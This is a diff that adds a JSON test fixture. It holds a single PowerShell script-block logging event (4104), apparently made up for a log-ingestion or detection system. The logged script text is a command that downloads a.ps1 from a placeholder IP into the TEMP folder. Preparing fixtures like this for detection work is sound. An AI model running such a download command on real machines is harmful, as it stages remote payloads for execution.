@@ -1,0 +1,18 @@
+[
+  {
+    "event_type": "Microsoft-Windows-PowerShell/4104",
+    "occurred_at": "2026-02-11T14:23:31.765432Z",
+    "payload": {
+      "agent_event_id": "WIN-PILOT-01|Microsoft-Windows-PowerShell/Operational|21877",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "record_id": 21877,
+      "computer": "WIN-PILOT-01",
+      "data": {
+        "script_block_text": "$ErrorActionPreference = 'Stop'\nInvoke-WebRequest -Uri http://198.51.100.23/a.ps1 -OutFile \"$env:TEMP\\a.ps1\"\n",
+        "script_block_id": "7b8e9f10-1a2b-3c4d-5e6f-708192a3b4c5",
+        "message_number": 1,
+        "message_total": 1
+      }
+    }
+  }
+]
